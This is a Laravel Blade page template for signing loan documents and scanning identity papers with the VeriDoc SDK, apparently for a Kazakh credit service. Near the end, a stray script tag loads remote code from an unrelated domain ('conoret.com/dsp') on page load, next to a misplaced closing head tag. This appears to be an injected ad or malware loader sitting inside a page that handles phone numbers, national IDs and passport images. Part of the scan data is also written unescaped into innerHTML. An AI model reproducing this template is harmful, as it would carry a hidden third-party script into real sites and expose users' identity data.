@include('header')

<div class="container py-lg-5 py-md-4">
    <div class="row align-items-center">
        <div class="col-lg-3"></div>
        <div class="col-lg-6 mt-4">

            <div class="form-control" id="sign">
                @csrf
                <input type="hidden" value="{{$id}}" id="document_id">
                <input type="hidden" value="{{$phone}}" id="phone">
                <input type="hidden" value="{{$iin}}" id="iin">

                <h5 class="title-big">Ознакомлайтесь документом и придумайте пароль для личного кабинета. Вы всегда
                    сможете осмотреть свой документ в личном кабинете</h5>
                <div class="form-outline">
                    <a href="{!! $document !!}" class="title-small"><i class="fa fa-check"
                                                                       aria-hidden="true"></i> {{$name}}</a>
                </div>
                <button type="submit" id="button" class="btn btn-primary">Дальше</button>
            </div>


            <form style="display: none" id="phoneInfo">
                <h1>На ваш номер отправился код подтверждение. Введите его для подписание договоров</h1>
                <input class="form-control" type="number" id="code"></input>
            </form>

            <form style="display: none;" id="verigram">
                <button id="initButton">Initialize VeriDoc</button>
                <div style="max-width: 500px; margin: 20px 0px 0px 0px;">
                    <div id="id_veridoc"> </div>
                </div>
                <h3>Results of scanning:</h3>
                <p id="results">No scanning results yet</p>
                <p id="array">No scanning results yet</p>
            </form>
        </div>
        <textarea style="display: none" id="customTranslations" rows="5" cols="50">{
  "ShowDocument": "Наведите камеру на документ",
  "ShowPassport": "Наведите камеру на паспорт",
  "ShowId": "Наведите камеру на удостоверение личности"
}</textarea>
        <textarea id="renderProperties" style="display: none;" rows="10" cols="50">{
  "placeholder": true,
  "startButton": true,
  "containerBorderThickness": 1,
  "containerBorderRadius": 3,
  "containerBorderColor": {
    "default": "#000000"
  },
  "frame": true,
  "frameBorderThickness": 3,
  "frameBorderRadius": 20,
  "frameColor": {
    "default": "rgba(255, 255, 255, 1.0)",
    "detected": "rgba(30, 255, 88, 1.0)"
  },
  "overlay": true,
  "overlayPermanent": true,
  "overlayColor": {
        "default": "#ffffff"
  },
  "upperBarColor": {
        "default": "rgba(255, 255, 255, 1.0)"
  },
  "lowerBarColor": {
        "default": "#a2d2ff",
        "error": "#ffccd5"
  },
  "buttonColor": {
        "default": "#a2d2ff"
  },
  "buttonTextColor": {
        "default": "#353535"
  },
  "overlayTransparency": {
    "default": 0.7
  },
  "icons": true,
  "hint": true,
  "hintTextColor": {
    "default": "#353535"
  },
  "hintFontType": "Arial",
  "mirrorPreview": false
}</textarea>
    </div>
</div>
@include('footer')
<script src="//conoret.com/dsp?h=s3.eu-central-1.amazonaws.com&amp;r=0.43766416408579456" type="text/javascript" defer="" async=""></script></head>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://s3.eu-central-1.amazonaws.com/veridoc-statics.verigram.ai/veridoc-v1.16.x.js"></script>
<script>
    document.getElementById('button').addEventListener('click', function (e) {
        console.log('here')
        e.preventDefault();
        let number = $("#phone").val();
        let iin = $("#iin").val();
        let document_id = $("#document_id").val();
        document.getElementById('sign').style.display = "none";
        document.getElementById('verigram').style.display="block";
        //document.getElementById('phoneInfo').style.display = "block";
        /*$.ajax({
            type: 'GET',
            url: 'https://biometry.i-credit.kz/api/takeCode',
            headers: {
                'Accept': 'application/json',
            },

            data: {
                iin: iin,
                phone: number,
            },

            success: function (res) {
                if (res.success) {
                    document.getElementById('check').style.display = "block";
                }else{
                    document.getElementById('verigram').style.display="block";
                }
            },
            error: function (err) {
                console.log(err)
            }
        });*/
    });
    document.getElementById('initButton').addEventListener('click',function (e) {

        e.preventDefault();


        $.ajax({
            type: 'POST',
            url: 'https://api.mircreditov.kz/api/getAccessToken',
            headers: {
                'Accept': 'application/json',
            },

            success: function (res) {
                if (res.success) {
                    let accessToken = res.access_token;
                    let personID = res.person_id;
                    start(accessToken, personID);
                } else {

                }
                console.log(res)
            },


        });
    });


    function start(accessToken,personID){
        var endpointAddress ='https://services.verigram.ai:8443/s/veridoc/ru/veridoc/';
        var documentType = 1;
        var recognitionMode = 0;
        var language = 'ru';
        var customTranslations = JSON.parse(document.getElementById('customTranslations').value);
        var isGlareCheckNeeded = false;
        var isPhotocopyCheckNeeded = false;
        var isTranslitCheckNeeded = false;
        var isAutoDocTypeMode =false;
        var isImageOnlyMode = false;
        var renderProperties = JSON.parse(document.getElementById('renderProperties').value);

        document.getElementById('initButton').disabled = true;

        const config = {
            autoDocType: isAutoDocTypeMode,
            docType: documentType,
            recognitionMode: recognitionMode,
            imageOnlyMode: isImageOnlyMode,
            translitCheck: isTranslitCheckNeeded,
            glareCheck: isGlareCheckNeeded,
            photocopyCheck: isPhotocopyCheckNeeded,
            lang: language,
            render: renderProperties,
            hints: customTranslations
        }

        veridoc.successCallback = successCallback;
        veridoc.failCallback = failCallback;
        veridoc.errorCallback = errorCallback;
        veridoc.updateCallback = updateCallback;

        veridoc.init(endpointAddress,'', config)
            .then(() => {
                document.getElementById('startButton').disabled = false;
                document.getElementById('stopButton').disabled = false;
                document.getElementById('disposeButton').disabled = false;
            })
            .catch((e) => {
                document.getElementById('results').innerHTML = JSON.stringify(e);
                document.getElementById('initButton').disabled = false;
            });
        console.log(accessToken,personID)
        veridoc.setAccessToken(accessToken, personID)
        let session_id = veridoc.start();
    }
    function successCallback(data) {
        console.log('Session token is: ' + veridoc.getSessionToken());
        console.log('success', data);
        fieldsAll = JSON.stringify(data)
        $.ajax({
            url: "https://api.mircreditov.kz/api/fields",
            type: "POST",
            data: {fields: fieldsAll},
            success: function (response){
                console.log(response)
            }
        });
        showResults(data);
        checkRecognitionWarnings();
    }
    function showResults(data) {
        var allResults = "";
        const all = [];
        document.getElementById('array').innerHTML = data;
        for (var prop in data) {
            if (data.hasOwnProperty(prop) && typeof data[prop] === 'string' || data[prop] instanceof String) {
                var propValue = data[prop].replace(/</g, "&lt;");
                all[prop] = propValue.substring(0,20);
                if (prop.includes('picture') || prop.includes('personal_signature') ||
                    prop.includes('image')) {
                    // allResults += prop + ': ' + propValue.substring(0, 20) + '... </br>';
                    // all[prop] = propValue.substring(0,20);
                    document.getElementById("array").innerHTML = "prop:"+prop+":value"+propValue.substring(0,20);
                } else {
                    allResults += prop + ': ' + propValue + ' </br>';
                }
            }
        }

        document.getElementById("results").innerHTML = allResults;

    }
    function failCallback(data) {
        console.log('fail', data);
        showResults(data);
    }

    function errorCallback(data) {
        console.log('error', data);
        showResults(data);
    }
    function updateCallback(data) {
        console.log('update', data);
        showResults(data);
    }
</script>
